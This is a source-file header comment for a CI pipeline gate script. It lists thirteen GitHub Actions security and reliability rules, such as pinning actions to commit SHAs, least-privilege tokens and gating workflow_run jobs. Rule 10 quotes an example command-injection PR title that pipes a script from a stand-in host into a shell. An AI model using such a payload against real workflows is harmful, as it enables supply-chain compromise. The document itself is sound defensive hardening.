/**
 * CI/CD pipeline gate.
 *   1. timeout-minutes ON EVERY JOB. The default is 360 — six hours of billed
 *      minutes on a hung `npm ci`, or of a stuck electron-builder run.
 *   2. concurrency WITH AN EXPLICIT cancel-in-progress. Omitting the key defaults
 *      it to false, so pushing three commits queues three full runs and the
 *      answer you finally get is for the oldest one.
 *   3. LEAST-PRIVILEGE permissions, DECLARED. With no `permissions:` block the
 *      token inherits the repository default, which for older repos is
 *      read/write on everything — including `contents`, i.e. push access.
 *   4. EVERY `uses:` PINNED TO A COMMIT SHA, with the version in a comment. A tag
 *      is a movable pointer: whoever controls the action repo can repoint `@v5`
 *      at a commit that reads your secrets, and nothing in your workflow changes.
 *      The release workflow has `contents: write` and publishes the installers
 *      users download, so this is the supply chain of the shipped artefact.
 *   5. THE RUNNER IMAGE PINNED. `ubuntu-latest` and `macos-latest` move between
 *      major versions on GitHub's schedule, not yours, and take the preinstalled
 *      toolchain with them — which for a native build (node-llama-cpp,
 *      onnxruntime) means the compiler and the glibc the binaries link against.
 *   6. `npm ci`, NEVER `npm install`. install rewrites the lockfile to satisfy the
 *      ranges; ci fails instead. Only one of those is a check.
 *   7. `cache: npm` ON setup-node. Not correctness, just minutes.
 *   8. EVERY JOB IN A workflow_run WORKFLOW GATES ON conclusion == 'success', AND
 *      — if it checks out code — ON event == 'push'. Two holes behind one `if:`.
 *      The first: workflow_run fires on `completed`, which includes failure,
 *      cancellation and timeout, so without the conclusion gate a red CI run
 *      builds and publishes exactly as a green one does. Branch protection does
 *      not cover this; protection governs what may MERGE.
 *      The second: workflow_run fires after CI COMPLETES, and CI runs on pull
 *      requests, which have not merged and have not been reviewed. `branches:
 *      [main]` does not save you — it matches workflow_run.head_branch, which for
 *      a PR is the HEAD branch, and a fork's default branch is also called
 *      `main`. So a PR from `stranger/leaf:main` reaches a job carrying THIS
 *      repository's token and `contents: write`, and rule 9 then dutifully checks
 *      out the fork's commit and builds it — into a signed release asset.
 *   9. checkout PINNED TO workflow_run.head_sha. Under workflow_run,
 *      `github.sha` is the default branch's HEAD when the event fired, not the
 *      commit CI validated. They differ precisely when commits land fast — when
 *      you can least afford to ship something untested.
 *  10. NO UNTRUSTED INPUT SPLICED INTO A `run:` BLOCK. `${{ }}` is textual
 *      substitution performed before the shell sees the script, so a PR titled
 *      `"; curl evil.sh | sh #` runs as the workflow. Pass it through `env:`,
 *      where it is data. (pr-title.yml already does this — the rule keeps it so.)
 *  11. EVERY `npm run` A WORKFLOW INVOKES EXISTS. Renaming a script is a one-line
 *      change in package.json that breaks CI from a file nobody opened.
 *  12. EVERY GATE SCRIPT IS WIRED IN, AT ALL THREE LEVELS: to a package.json
 *      script, into `ci:check`, and to a step in ci.yml. This is the one that
 *      protects the other eleven — and the one that catches a gate imported into
 *      the tree and never connected to anything, which passes forever because
 *      nothing ever runs it.
 *  13. THE CI NODE VERSION SATISFIES engines.node. Nothing reads `engines` during
 *      a workflow, so the two drift silently: CI proves the app works on the
 *      major IT installs, while `engines` tells contributors and `npm ci` a
 *      different one is enough. Whichever is lower is the one nobody tests.               → check-refactoring.mjs
